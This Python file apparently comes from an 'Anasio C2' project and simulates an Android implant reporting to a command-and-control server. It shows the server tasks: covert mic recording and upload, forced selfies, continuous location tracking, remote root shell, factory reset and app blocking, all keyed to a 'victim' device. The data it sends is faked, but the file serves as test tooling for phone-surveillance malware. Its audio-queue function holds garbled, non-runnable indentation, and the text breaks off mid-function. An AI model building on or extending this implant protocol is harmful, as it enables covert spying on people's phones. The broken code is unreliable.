"""
Anasio C2 — Full Device Simulator
Simulates an Android implant over WebSocket, handling every task the backend
can dispatch: audio blast, mic recording, selfie capture, shell commands, power
commands, factory reset, location tracking, app management, screen time, etc.
"""

import asyncio
import io
import json
import math
import random
import sys
import threading
import time
import urllib.parse
import urllib.request
import uuid
import wave
from contextlib import suppress

try:
    import readline
except ImportError:
    readline = None

# ── Banner ─────────────────────────────────────────────────────────────────────
print("=" * 60)
print("   Anasio C2 — Android Implant Simulator (WebSocket)")
print("=" * 60)

# ── Server selection ───────────────────────────────────────────────────────────
if sys.stdin.isatty():
    choice = input("\nSelect server  1=Local  2=Remote  [Default: 1]: ").strip() or "1"
else:
    choice = "1"

if choice == "2":
    raw = input("\nServer domain/IP [Default: localhost]: ").strip() or "localhost"
    raw = raw.replace("http://", "").replace("https://", "").split("/")[0]
    BASE_URL         = f"wss://{raw}/ws"
    UPLOAD_URL       = f"https://{raw}/upload_audio"
    UPLOAD_SELFIE    = f"https://{raw}/api/upload-selfie"
    AUDIO_STARTED    = f"https://{raw}/audio_started"
    AUDIO_DONE       = f"https://{raw}/audio_done"
    IPC_URL          = f"https://{raw}/ipc"
else:
    BASE_URL         = "ws://127.0.0.1:8000/ws"
    UPLOAD_URL       = "http://127.0.0.1:8000/upload_audio"
    UPLOAD_SELFIE    = "http://127.0.0.1:8000/api/upload-selfie"
    AUDIO_STARTED    = "http://127.0.0.1:8000/audio_started"
    AUDIO_DONE       = "http://127.0.0.1:8000/audio_done"
    IPC_URL          = "http://127.0.0.1:8000/ipc"

IMPLANT_KEY = "DeltaForce2027"
DEVICE_ID   = "SIMULATED_VICTIM_PHONE"

# ── Simulated device state ─────────────────────────────────────────────────────
installed_apps       = "com.android.settings,com.whatsapp,com.facebook.katana,com.instagram.android,com.google.android.gm,com.spotify.music"
location_tracking    = True
lat, lon             = 56.9496, 24.1052
heading              = random.uniform(0, 360)
speed_ms             = random.uniform(0.5, 2.0)
battery              = 87
charging             = 0
screen_time_minutes  = 0
ping_interval        = 5
audio_playing        = False   # True while an audio-blast is "playing" on device
audio_loops_left     = 0
# audio_stop_event is created fresh per-blast inside simulate_audio_blast()
_audio_stop_event: asyncio.Event | None = None

# Queue-based audio simulation (mirrors server-side queued tasks)
audio_task_queue: list[dict] = []  # list of {task_id, type, volume, loops}
current_audio_task: dict | None = None
_queue_processor_task: asyncio.Task | None = None

last_hour_reported       = None
last_sent_installed_apps = None
last_sent_battery        = None
last_sent_charging       = None

print_lock     = threading.Lock()
typing         = False
current_prompt = ""


# ══════════════════════════════════════════════════════════════════════════════
# I/O helpers
# ══════════════════════════════════════════════════════════════════════════════

def safe_print(*args, **kwargs):
    """Print without mangling a partially-typed input line."""
    global typing, current_prompt
    with print_lock:
        kwargs.setdefault("flush", True)
        if typing:
            line_buf = readline.get_line_buffer() if readline else ""
            sys.stdout.write("\r")
            sys.stdout.write(" " * (len(current_prompt) + len(line_buf) + 2))
            sys.stdout.write("\r")
            print(*args, **kwargs)
            if current_prompt:
                sys.stdout.write(current_prompt)
            if line_buf:
                sys.stdout.write(line_buf)
            sys.stdout.flush()
            return
        print(*args, **kwargs)


def _http_post(url: str, fields: dict, files: dict | None = None,
               extra_headers: dict | None = None) -> bytes:
    """
    Minimal multipart/form-data POST using only stdlib.
    fields  = {name: value_str}
    files   = {name: (filename, content_bytes, content_type)}
    Returns the response body (raises on HTTP error).
    """
    boundary = uuid.uuid4().hex
    parts: list[bytes] = []

    for name, value in fields.items():
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n"
            .encode()
        )

    if files:
        for name, (filename, data, ctype) in files.items():
            header = (
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\n"
                f"Content-Type: {ctype}\r\n\r\n"
            ).encode()
            parts.append(header + data + b"\r\n")

    parts.append(f"--{boundary}--\r\n".encode())
    body = b"".join(parts)

    req = urllib.request.Request(url, data=body)
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    if extra_headers:
        for k, v in extra_headers.items():
            req.add_header(k, v)

    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read()


# ══════════════════════════════════════════════════════════════════════════════
# HTTP upload helpers  (run in thread pool via asyncio.to_thread)
# ══════════════════════════════════════════════════════════════════════════════

def _make_dummy_wav(duration_s: int = 5, sample_rate: int = 8000) -> bytes:
    buf = io.BytesIO()
    with wave.open(buf, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(1)
        w.setframerate(sample_rate)
        w.writeframes(b"\x80" * (sample_rate * duration_s))
    return buf.getvalue()


def _make_dummy_jpeg() -> bytes:
    """Return a minimal valid JPEG (1×1 pixel) so magic-byte validation passes."""
    return (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00@\x00@\x00\x00"
        b"\xff\xdb\x00C\x00" + b"\x08" * 64
        + b"\xff\xc0\x00\x11\x08\x00\x01\x00\x01\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01"
        b"\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00?\x00\xd2\xcf \xff\xd9"
    )


async def upload_audio_sim(duration_s: int = 5) -> None:
    """Upload a dummy WAV recording via multipart POST to /upload_audio."""
    safe_print(f"    [⬆] UPLOADING AUDIO ({duration_s}s) → {UPLOAD_URL}")
    try:
        wav_data = _make_dummy_wav(duration_s)
        await asyncio.to_thread(
            _http_post, UPLOAD_URL,
            fields={"implant_key": IMPLANT_KEY, "device_id": DEVICE_ID},
            files={"file": (f"rec_{duration_s}s.wav", wav_data, "audio/wav")},
        )
        safe_print("    [✔] AUDIO UPLOAD COMPLETE")
    except Exception as e:
        safe_print(f"    [✘] AUDIO UPLOAD FAILED: {e}")


async def _notify_ipc(event: str, extra: dict | None = None) -> None:
    """Helper to POST an IPC-style event to the server (/ipc)
    (used to emulate companion app reporting via reporter IPC)."""
    try:
        fields = {"device_id": DEVICE_ID, "implant_key": IMPLANT_KEY, "event": event}
        if extra:
            for k, v in extra.items():
                fields[k] = str(v)
        await asyncio.to_thread(_http_post, IPC_URL, fields)
        safe_print(f"    [✔] IPC: {event} posted")
    except Exception as e:
        safe_print(f"    [✘] IPC {event} failed: {e}")


async def _process_audio_queue() -> None:
    """Continuously process queued audio tasks sequentially."""
    global current_audio_task, audio_task_queue, _audio_stop_event
    safe_print("    [i] Audio queue processor started")
    while True:
        if current_audio_task is not None:
            # Wait briefly and loop
            await asyncio.sleep(0.2)
            continue
        if not audio_task_queue:
            # nothing to do; sleep and check again
            await asyncio.sleep(0.5)
            continue
        task = audio_task_queue.pop(0)
        current_audio_task = task
        task_id = task.get('task_id')
        t_type = task.get('type')

        # Vibrate task handling
        if t_type == 'vibrate' or task.get('duration') is not None:
            duration = int(task.get('duration', 1))
            safe_print(f"    [Q] Starting vibrate task {task_id} duration={duration}s")
            await _notify_ipc('audio_task_started', { 'task_id': task_id })
            _audio_stop_event = asyncio.Event()
            try:
                try:
                    await asyncio.wait_for(_audio_stop_event.wait(), timeout=duration)
                    safe_print(f"    [Q] Vibrate task {task_id} stopped early")
                    await _notify_ipc('audio_task_completed', {'task_id': task_id})
                except asyncio.TimeoutError:
                    safe_print(f"    [Q] Vibrate task {task_id} completed after {duration}s")
                    await _notify_ipc('audio_task_completed', {'task_id': task_id})
            finally:
                _audio_stop_event = None
                current_audio_task = None
            continue

        # Audio playback task (legacy numeric types)
        try:
            play_type = int(task.get('type', 0))
        except Exception:
            play_type = 0
        try:
            loops = int(task.get('loops', 0))
        except Exception:
            loops = 0

                vibrate_flag = bool(task.get('vibrate_with_audio', False))
                if vibrate_flag:
                    safe_print(f"    [Q] Task {task_id} requests vibration for full audio duration")
                safe_print(f"    [Q] Task {task_id} requests vibration for full audio duration")
            else:
                safe_print(f"    [Q] Task {task_id} requests vibration for {vibrate_duration}s (may be clipped to audio duration)")
        await _notify_ipc('audio_task_started', { 'task_id': task_id, 'play_audio': play_type })

        # Simulate playback using the same mechanism as simulate_audio_blast
        _audio_stop_event = asyncio.Event()
        try:
            wait_s = 3 * loops if loops > 0 else 3600
            try:
                await asyncio.wait_for(_audio_stop_event.wait(), timeout=wait_s)
                safe_print(f"    [Q] Task {task_id} stopped by cancel/clear")
                await _notify_ipc('audio_task_completed', {'task_id': task_id})
            except asyncio.TimeoutError:
                safe_print(f"    [Q] Task {task_id} completed after ~{wait_s}s")
                await _notify_ipc('audio_task_completed', {'task_id': task_id})
        finally:
            _audio_stop_event = None
            current_audio_task = None


def _ensure_queue_processor(loop: asyncio.AbstractEventLoop) -> None:
    global _queue_processor_task
    if _queue_processor_task is None or _queue_processor_task.done():
        _queue_processor_task = loop.create_task(_process_audio_queue())


async def upload_selfie_sim() -> None:
    """Upload a dummy JPEG selfie via multipart POST to /api/upload-selfie."""
    safe_print(f"    [⬆] UPLOADING SELFIE → {UPLOAD_SELFIE}")
    try:
        jpeg_data = _make_dummy_jpeg()
        await asyncio.to_thread(
            _http_post, UPLOAD_SELFIE,
            fields={},
            files={"selfie": ("selfie.jpg", jpeg_data, "image/jpeg")},
            extra_headers={"X-Implant-Key": IMPLANT_KEY, "X-Device-ID": DEVICE_ID},
        )
        safe_print("    [✔] SELFIE UPLOAD COMPLETE")
    except Exception as e:
        safe_print(f"    [✘] SELFIE UPLOAD FAILED: {e}")


async def notify_audio_started(play_type: int) -> None:
    """Tell the server the device started audio playback (updates audio_playing=1)."""
    try:
        await asyncio.to_thread(
            _http_post, AUDIO_STARTED,
            fields={"device_id": DEVICE_ID, "implant_key": IMPLANT_KEY, "play_audio": str(play_type)},
        )
        safe_print(f"    [✔] SERVER NOTIFIED: audio_started type={play_type}")
    except Exception as e:
        safe_print(f"    [✘] audio_started notify failed: {e}")


async def notify_audio_done() -> None:
    """Tell the server the device finished audio playback (resets play_audio=0)."""
    try:
        await asyncio.to_thread(
            _http_post, AUDIO_DONE,
            fields={"device_id": DEVICE_ID, "implant_key": IMPLANT_KEY},
        )
        safe_print("    [✔] SERVER NOTIFIED: audio_done")
    except Exception as e:
        safe_print(f"    [✘] audio_done notify failed: {e}")


async def simulate_audio_blast(play_type: int, loops: int) -> None:
    """
    Simulate audio playback: notify server it started, wait for stop command or
    timeout, then notify server it finished.
    """
    global audio_playing, audio_loops_left, _audio_stop_event
    audio_playing    = True
    audio_loops_left = loops
    wait_s           = 3 * loops if loops > 0 else 3600  # infinite = 1 hour cap

    # Create a fresh Event bound to the *current* running event loop
    _audio_stop_event = asyncio.Event()

    safe_print(f"    [\U0001f50a] AUDIO BLAST PLAYING: type={play_type} loops={'infinite' if loops == 0 else loops}")
    await notify_audio_started(play_type)

    try:
        await asyncio.wait_for(_audio_stop_event.wait(), timeout=wait_s)
        safe_print("    [\U0001f507] AUDIO BLAST STOPPED by server command")
    except asyncio.TimeoutError:
        safe_print(f"    [\U0001f50a] AUDIO BLAST FINISHED after ~{wait_s}s")

    audio_playing    = False
    audio_loops_left = 0
    _audio_stop_event = None
    await notify_audio_done()


# ══════════════════════════════════════════════════════════════════════════════
# Interactive command handler (runs as a separate async task)
# ══════════════════════════════════════════════════════════════════════════════

HELP_TEXT = """
  Commands:
    screen HH MM         — set screen time (e.g. screen 1 30 = 1h 30m)
    charge on|off        — set charging state
    toggle               — toggle charging on/off
    battery N            — set battery level (0–100)
    gps on|off           — enable/disable location tracking
    apps add <pkg>       — add a package to installed_apps
    apps remove <pkg>    — remove a package from installed_apps
    apps list            — list installed apps
    interval N           — set ping interval (seconds)
    error <src> <msg>    — send an error report
    status               — print current simulated device state
    help / ?             — show this help
    quit / exit          — disconnect and exit
"""


async def manual_command_sender(ws) -> None:
    """Reads interactive commands from stdin and sends appropriate WS payloads."""
    global screen_time_minutes, charging, battery, location_tracking
    global installed_apps, ping_interval, typing, current_prompt, audio_playing
    global last_sent_battery, last_sent_charging, last_sent_installed_apps

    def _base_payload() -> dict:
        return {
            "implant_key": IMPLANT_KEY,
            "device_id":   DEVICE_ID,
            "battery":     battery,
            "charging":    charging,
            "loc_state":   1 if location_tracking else 0,
            "lat":         lat if location_tracking else 0.0,
            "lon":         lon if location_tracking else 0.0,
            "installed_apps": installed_apps,
        }

    async def _send(payload: dict) -> None:
        await ws.send(json.dumps(payload))

    prompt = "\n[SIM] > "

    while True:
        try:
            typing         = True
            current_prompt = prompt
            entry = await asyncio.to_thread(input, prompt)
        except (EOFError, KeyboardInterrupt):
            typing         = False
            current_prompt = ""
            # If stdin is closed (e.g. running via nohup), hang the task instead of returning
            # Returning causes FIRST_COMPLETED to trigger, instantly dropping the WS connection!
            await asyncio.Future()  
            return
        finally:
            typing         = False
            current_prompt = ""

        entry = entry.strip()
        if not entry:
            continue

        parts = entry.split()
        cmd   = parts[0].lower()

        # ── quit ──────────────────────────────────────────────────────────────
        if cmd in ("quit", "exit"):
            safe_print("    [i] Disconnecting…")
            return

        # ── help ──────────────────────────────────────────────────────────────
        if cmd in ("help", "?"):
            safe_print(HELP_TEXT)
            continue

        # ── status ────────────────────────────────────────────────────────────
        if cmd == "status":
            safe_print(
                f"\n  Device:   {DEVICE_ID}\n"
                f"  Battery:  {battery}%  Charging: {'YES' if charging else 'NO'}\n"
                f"  GPS:      {'ON' if location_tracking else 'OFF'}  ({lat:.5f}, {lon:.5f})\n"
                f"  Screen:   {screen_time_minutes // 60}h {screen_time_minutes % 60}m\n"
                f"  Interval: {ping_interval}s\n"
                f"  Audio:    {'PLAYING' if audio_playing else 'idle'}\n"
                f"  Apps:     {installed_apps}"
            )
            continue

        # ── battery ───────────────────────────────────────────────────────────
        if cmd == "battery":
            if len(parts) < 2:
                safe_print("    [!] Usage: battery N  (0–100)")
                continue
            try:
                battery = max(0, min(100, int(parts[1])))
            except ValueError:
                safe_print("    [!] Invalid number")
                continue
            last_sent_battery = None
            try:
                p = _base_payload()
                await _send(p)
                safe_print(f"    [>] BATTERY SET: {battery}%")
            except Exception as e:
                safe_print(f"    [!] Send failed: {e}")
            continue

        # ── charging / toggle ─────────────────────────────────────────────────
        if cmd in ("charge", "charging"):
            if len(parts) < 2:
                safe_print("    [!] Usage: charge on|off")
                continue
            if parts[1].lower() in ("on", "1", "yes", "y"):
                charging = 1
            elif parts[1].lower() in ("off", "0", "no", "n"):
                charging = 0
            else:
                safe_print("    [!] Usage: charge on|off")
                continue
            last_sent_charging = None
            try:
                await _send(_base_payload())
                safe_print(f"    [>] CHARGING: {'ON' if charging else 'OFF'}")
            except Exception as e:
                safe_print(f"    [!] Send failed: {e}")
            continue

        if cmd == "toggle":
            charging = 0 if charging else 1
            last_sent_charging = None
            try:
                await _send(_base_payload())
                safe_print(f"    [>] CHARGING TOGGLED: {'ON' if charging else 'OFF'}")
            except Exception as e:
                safe_print(f"    [!] Send failed: {e}")
            continue

        # ── screen time ───────────────────────────────────────────────────────
        if cmd == "screen":
            if len(parts) < 3:
                safe_print("    [!] Usage: screen HH MM")
                continue
            try:
                hh = max(0, int(parts[1]))
                mm = max(0, int(parts[2]))
                screen_time_minutes = hh * 60 + mm
            except ValueError:
                safe_print("    [!] Invalid values — use integers")
                continue
            try:
                p = _base_payload()
                p["screen_time_minutes"] = screen_time_minutes
                await _send(p)
                safe_print(f"    [>] SCREEN TIME SENT: {hh}h {mm}m")
            except Exception as e:
                safe_print(f"    [!] Send failed: {e}")
            continue

        # ── gps ───────────────────────────────────────────────────────────────
        if cmd == "gps":
            if len(parts) < 2:
                safe_print("    [!] Usage: gps on|off")
                continue
            location_tracking = parts[1].lower() in ("on", "1", "yes", "y")
            try:
                await _send(_base_payload())
                safe_print(f"    [>] GPS TRACKING: {'ON' if location_tracking else 'OFF'}")
            except Exception as e:
                safe_print(f"    [!] Send failed: {e}")
            continue

        # ── apps ──────────────────────────────────────────────────────────────
        if cmd == "apps":
            if len(parts) < 2:
                safe_print("    [!] Usage: apps add <pkg> | apps remove <pkg> | apps list")
                continue
            sub = parts[1].lower()
            if sub == "list":
                safe_print("    [i] Installed apps:")
                for a in installed_apps.split(","):
                    if a.strip():
                        safe_print(f"        • {a.strip()}")
                continue
            if sub == "add" and len(parts) >= 3:
                pkg = parts[2].strip()
                apps_list = [a for a in installed_apps.split(",") if a.strip()]
                if pkg not in apps_list:
                    apps_list.append(pkg)
                    installed_apps = ",".join(apps_list)
                    safe_print(f"    [+] Added: {pkg}")
                else:
                    safe_print(f"    [i] Already present: {pkg}")
                last_sent_installed_apps = None
                try:
                    await _send(_base_payload())
                except Exception as e:
                    safe_print(f"    [!] Send failed: {e}")
                continue
            if sub == "remove" and len(parts) >= 3:
                pkg = parts[2].strip()
                apps_list = [a for a in installed_apps.split(",") if a.strip() and a.strip() != pkg]
                installed_apps = ",".join(apps_list)
                safe_print(f"    [-] Removed: {pkg}")
                last_sent_installed_apps = None
                try:
                    await _send(_base_payload())
                except Exception as e:
                    safe_print(f"    [!] Send failed: {e}")
                continue
            safe_print("    [!] Usage: apps add <pkg> | apps remove <pkg> | apps list")
            continue

        # ── interval ──────────────────────────────────────────────────────────
        if cmd == "interval":
            if len(parts) < 2:
                safe_print("    [!] Usage: interval N")
                continue
            try:
                ping_interval = max(1, int(parts[1]))
                safe_print(f"    [i] Ping interval set to {ping_interval}s (local only — server controls this)")
            except ValueError:
                safe_print("    [!] Invalid number")
            continue

        # ── error report ──────────────────────────────────────────────────────
        if cmd == "error":
            if len(parts) < 3:
                safe_print("    [!] Usage: error <source> <message…>")
                continue
            source = parts[1]
            msg    = " ".join(parts[2:])
            try:
                await _send({
                    "implant_key":  IMPLANT_KEY,
                    "device_id":    DEVICE_ID,
                    "error_source": source,
                    "error_msg":    msg,
                })
                safe_print(f"    [>] ERROR SENT: {source} → {msg}")
            except Exception as e:
                safe_print(f"    [!] Send failed: {e}")
            continue

        safe_print(f"    [!] Unknown command: '{cmd}'.  Type 'help' for a list.")


# ══════════════════════════════════════════════════════════════════════════════
# WebSocket receiver — handles every task the backend can dispatch
# ══════════════════════════════════════════════════════════════════════════════

async def receiver(ws) -> None:
    global location_tracking, ping_interval, installed_apps, audio_playing

    async for raw in ws:
        safe_print(f"[<] RECV: {raw}")
        try:
            cmd = json.loads(raw)
        except json.JSONDecodeError:
            safe_print("    [!] Non-JSON frame ignored")
            continue

        if cmd.get("implant_key") != IMPLANT_KEY:
            safe_print("    [!] REJECTED: invalid implant_key")
            continue

        task = cmd.get("task")

        # ── Location state query ──────────────────────────────────────────────
        if task == "check_location_state":
            safe_print("    [i] CHECK_LOCATION_STATE request")
            reply = {
                "implant_key": IMPLANT_KEY,
                "device_id":   DEVICE_ID,
                "loc_state":   1 if location_tracking else 0,
                "battery":     battery,
                "charging":    charging,
                "lat":         lat if location_tracking else 0.0,
                "lon":         lon if location_tracking else 0.0,
            }
            await ws.send(json.dumps(reply))
            safe_print(f"    [>] loc_state sent: {'ON' if location_tracking else 'OFF'}")

        # ── Set location tracking ─────────────────────────────────────────────
        elif task == "set_location":
            track             = cmd.get("track", 1)
            location_tracking = (int(track) == 1)
            safe_print(f"    [i] LOCATION TRACKING → {'ON' if location_tracking else 'OFF'}")

        # ── Set ping interval ─────────────────────────────────────────────────
        elif task == "set_interval":
            ping_interval = int(cmd.get("interval", ping_interval))
            safe_print(f"    [i] INTERVAL → {ping_interval}s")

        # ── App list refresh ──────────────────────────────────────────────────
        elif task == "refresh_installed_apps":
            safe_print("    [i] REFRESH_INSTALLED_APPS request")
            reply = {
                "implant_key":   IMPLANT_KEY,
                "device_id":     DEVICE_ID,
                "battery":       battery,
                "charging":      charging,
                "loc_state":     1 if location_tracking else 0,
                "lat":           lat if location_tracking else 0.0,
                "lon":           lon if location_tracking else 0.0,
                "installed_apps": installed_apps,
            }
            await ws.send(json.dumps(reply))
            safe_print(f"    [>] App list sent ({len(installed_apps.split(','))} apps)")

        # ── Blocked apps update ───────────────────────────────────────────────
        elif task == "update_blocked_apps":
            blocked = cmd.get("apps", "")
            safe_print(f"    [i] BLOCKED APPS UPDATED: {blocked or '(none)'}")
            
        elif task == "piano_note":
            note = cmd.get("note")
            velocity = cmd.get("velocity", 0)
            state = cmd.get("state", 0)
            if state == 1:
                safe_print(f"    [🎹] PIANO NOTE ON : {note} (vel: {velocity})")
            else:
                safe_print(f"    [🎹] PIANO NOTE OFF: {note}")

        elif task == "system_alert":
            state = cmd.get("state")
            text  = cmd.get("text", "")
            if state == 1:
                safe_print(f"    [🔔] SYSTEM ALERT SHOWN: \"{text}\"")
                # Notify server the alert is now visible (IPC ping)
                try:
                    await asyncio.to_thread(
                        _http_post, IPC_URL,
                        fields={"device_id": DEVICE_ID, "implant_key": IMPLANT_KEY, "event": "alert_shown"},
                    )
                    safe_print("    [✔] IPC: alert_shown sent to server")
                except Exception as e:
                    safe_print(f"    [✘] IPC alert_shown failed: {e}")
            else:
                safe_print("    [🔕] SYSTEM ALERT DISMISSED")
                # Notify server the alert was dismissed (IPC ping)
                try:
                    await asyncio.to_thread(
                        _http_post, IPC_URL,
                        fields={"device_id": DEVICE_ID, "implant_key": IMPLANT_KEY, "event": "alert_dismissed"},
                    )
                    safe_print("    [✔] IPC: alert_dismissed sent to server")
                except Exception as e:
                    safe_print(f"    [✘] IPC alert_dismissed failed: {e}")

        # ── Audio blast ───────────────────────────────────────────────────────
        elif task == "audio_play":
            # New queued audio play command from server (includes task_id)
            task_id = cmd.get('task_id')
            try:
                play_type = int(cmd.get('type', cmd.get('play', 0)))
            except (TypeError, ValueError):
                play_type = 0
            try:
                loops = int(cmd.get('loops', 0))
            except (TypeError, ValueError):
                loops = 0
            volume = float(cmd.get('volume', 1.0) or 1.0)
            if not task_id:
                # fallback to legacy behavior
                safe_print("    [!] audio_play missing task_id — treating as audio_blast")
            else:
                audio_task_queue.append({ 'task_id': task_id, 'type': play_type, 'volume': volume, 'loops': loops, 'vibrate_with_audio': bool(cmd.get('vibrate_with_audio', False)) })
                safe_print(f"    [Q] Enqueued audio task {task_id} type={play_type} loops={loops}")
                # ensure the queue processor is running
                try:
                    loop = asyncio.get_running_loop()
                    _ensure_queue_processor(loop)
                except Exception:
                    pass

        elif task == "vibrate":
            # Enqueue a vibrate-only task
            task_id = cmd.get('task_id')
            try:
                duration = int(cmd.get('duration', 1))
            except (TypeError, ValueError):
                duration = 1
            if not task_id:
                safe_print("    [!] vibrate missing task_id — ignoring")
            else:
                audio_task_queue.append({ 'task_id': task_id, 'type': 'vibrate', 'duration': duration })
                safe_print(f"    [Q] Enqueued vibrate task {task_id} duration={duration}s")
                try:
                    loop = asyncio.get_running_loop()
                    _ensure_queue_processor(loop)
                except Exception:
                    pass

        elif task == "audio_cancel":
            # Cancel a specific queued or currently playing task
            task_id = cmd.get('task_id')
            safe_print(f"    [Q] Received cancel for task {task_id}")
            # Remove from pending queue
            removed = False
            for i, t in enumerate(list(audio_task_queue)):
                if str(t.get('task_id')) == str(task_id):
                    del audio_task_queue[i]
                    removed = True
                    break
            # If currently playing, stop it
            if current_audio_task and str(current_audio_task.get('task_id')) == str(task_id):
                if _audio_stop_event is not None:
                    _audio_stop_event.set()
                    removed = True
            if removed:
                await _notify_ipc('audio_task_cancelled', {'task_id': task_id})

        elif task == "audio_clear_queue":
            # Clear all pending tasks and stop current
            safe_print("    [Q] Clearing audio queue on device")
            # notify cancellation for pending tasks
            pending_ids = [t.get('task_id') for t in audio_task_queue]
            audio_task_queue.clear()
            for tid in pending_ids:
                await _notify_ipc('audio_task_cancelled', {'task_id': tid})
            # stop current
            if _audio_stop_event is not None:
                _audio_stop_event.set()
            continue

        elif task == "audio_blast":
            play_val  = cmd.get("play", "0")
            loops_val = cmd.get("loops", "0")
            try:
                play_type = int(play_val)
                loops     = int(loops_val)
            except (ValueError, TypeError):
                play_type = 0
                loops     = 0
            type_names = {0: "stop", 1: "Siren", 2: "Alert Bells", 3: "Xylophone"}
            if play_type == 0:
                # Signal the blast coroutine to stop immediately.
                # Do NOT call notify_audio_done() here — simulate_audio_blast()
                # will call it itself once it unblocks from the stop event,
                # preventing a double-fire and a duplicate "audio stopped" toast.
                if _audio_stop_event is not None:
                    _audio_stop_event.set()
                else:
                    # No blast running; just notify directly so server resets state.
                    audio_playing = False
                    await notify_audio_done()
                safe_print("    [\U0001f507] AUDIO BLAST STOPPED by server command")
            else:
                safe_print(f"    [🔊] AUDIO BLAST: {type_names.get(play_type, f'type {play_type}')} × {'∞' if loops == 0 else loops} loops")
                asyncio.create_task(simulate_audio_blast(play_type, loops))

        # ── Mic recording ─────────────────────────────────────────────────────
        elif task == "mic_record":
            duration = int(cmd.get("duration", 5))
            safe_print(f"    [🎤] MIC_RECORD: {duration}s — simulating recording…")
            asyncio.create_task(_do_mic_record(duration))

        # ── Force selfie ──────────────────────────────────────────────────────
        elif task == "force_selfie":
            safe_print("    [📸] FORCE_SELFIE request")
            asyncio.create_task(upload_selfie_sim())

        # ── Power commands ────────────────────────────────────────────────────
        elif task == "power_cmd":
            action = cmd.get("action", "")
            if action == "reboot":
                safe_print("    [⚡] REBOOT command — simulating restart (reconnecting in 3s)…")
                asyncio.create_task(_simulate_reconnect(ws, delay=3))
            elif action == "shutdown":
                safe_print("    [⚡] SHUTDOWN command — device going offline (reconnect in 10s)…")
                asyncio.create_task(_simulate_reconnect(ws, delay=10))
            else:
                safe_print(f"    [!] Unknown power action: {action}")

        # ── Factory reset ─────────────────────────────────────────────────────
        elif task == "factory_reset":
            safe_print("    [💥] FACTORY RESET command received — simulating wipe (reconnect in 15s)…")
            asyncio.create_task(_simulate_reconnect(ws, delay=15))

        # ── Shell command ─────────────────────────────────────────────────────
        elif task == "shell":
            command = cmd.get("command", "").strip()
            safe_print(f"    [💻] SHELL: {command!r}")
            asyncio.create_task(_do_shell(ws, command))

        else:
            safe_print(f"    [!] UNKNOWN TASK: {task!r}")


# ══════════════════════════════════════════════════════════════════════════════
# Task helpers  (run as asyncio tasks from the receiver)
# ══════════════════════════════════════════════════════════════════════════════

async def _do_mic_record(duration_s: int) -> None:
    """Wait for the recording duration then upload."""
    safe_print(f"    [🎤] Recording {duration_s}s…")
    await asyncio.sleep(min(duration_s, 10))  # cap sim wait to 10s for speed
    await upload_audio_sim(duration_s)


async def _do_shell(ws, command: str) -> None:
    """
    Simulate shell execution: produce plausible fake output for common commands,
    then send the result back to the server via the WS command_result frame.
    """
    await asyncio.sleep(0.3)  # simulate execution delay

    fake_outputs: dict[str, str] = {
        "id":              "uid=0(root) gid=0(root) groups=0(root)",
        "whoami":          "root",
        "hostname":        "android-device",
        "uname -a":        "Linux android-device 5.10.110-android13 #1 SMP PREEMPT Thu Jan 1 00:00:00 UTC 2023 aarch64",
        "uptime":          "up 3 days, 14:22,  0 users,  load average: 0.18, 0.22, 0.19",
        "date":            time.strftime("%a %b %d %H:%M:%S UTC %Y", time.gmtime()),
        "pwd":             "/data/local/tmp",
        "ls":              "data  proc  sys  sdcard  cache",
        "ls /sdcard":      "Android  DCIM  Download  Music  Pictures  Videos  WhatsApp",
        "ps":              "PID   USER     CMD\n1     root     /init\n2     root     kthreadd",
        "cat /proc/cpuinfo": "processor : 0\nmodel name : ARMv8 Processor\nhardware : Qualcomm Technologies\n",
        "cat /proc/meminfo": "MemTotal: 6291456 kB\nMemFree:  2048000 kB\nMemAvailable: 3145728 kB\n",
        "netstat":         "Active Internet connections\nProto  Local Address       Foreign Address     State\ntcp    0.0.0.0:22          0.0.0.0:*           LISTEN",
        "ip route":        "default via 192.168.1.1 dev wlan0\n192.168.1.0/24 dev wlan0 proto kernel",
        "ifconfig wlan0":  "wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\ninet 192.168.1.42  netmask 255.255.255.0  broadcast 192.168.1.255",
    }

    out = fake_outputs.get(command.strip())
    if out is None:
        # generic fallback
        out = f"simulated output for: {command}\n$ "

    result_frame = json.dumps({
        "implant_key":    IMPLANT_KEY,
        "device_id":      DEVICE_ID,
        "command_result": out,
    })
    try:
        await ws.send(result_frame)
        safe_print(f"    [>] SHELL RESULT SENT: {out[:80]}{'…' if len(out) > 80 else ''}")
    except Exception as e:
        safe_print(f"    [!] Failed to send shell result: {e}")


async def _simulate_reconnect(ws, delay: int = 5) -> None:
    """Close the current WS — the outer retry loop will reconnect after `delay`."""
    await asyncio.sleep(delay)
    with suppress(Exception):
        await ws.close()


# ══════════════════════════════════════════════════════════════════════════════
# Telemetry sender loop
# ══════════════════════════════════════════════════════════════════════════════

async def sender_loop(ws) -> None:
    """Sends periodic telemetry pings to the server."""
    global lat, lon, battery, charging, heading, speed_ms
    global screen_time_minutes, last_hour_reported
    global last_sent_installed_apps, last_sent_battery, last_sent_charging

    while True:
        # Simulate movement
        if location_tracking:
            speed_ms  = max(0.2, min(speed_ms + random.uniform(-0.25, 0.25), 6.0))
            heading   = (heading + random.uniform(-10, 10)) % 360
            distance  = speed_ms * ping_interval
            lat      += (distance * math.cos(math.radians(heading))) / 111_320
            lon      += (distance * math.sin(math.radians(heading))) / (111_320 * math.cos(math.radians(lat)))
            lat      += random.uniform(-0.00001, 0.00001)
            lon      += random.uniform(-0.00001, 0.00001)

        # Simulate battery drain / charge
        if charging == 1:
            if battery < 100 and random.random() < 0.8:
                battery = min(100, battery + 1)
        else:
            if battery > 1 and random.random() < 0.1:
                battery -= 1

        # Build delta payload — only include fields that changed
        now = time.localtime()
        payload: dict = {
            "implant_key": IMPLANT_KEY,
            "device_id":   DEVICE_ID,
            "loc_state":   1 if location_tracking else 0,
            "lat":         lat if location_tracking else 0.0,
            "lon":         lon if location_tracking else 0.0,
        }

        if last_sent_installed_apps != installed_apps:
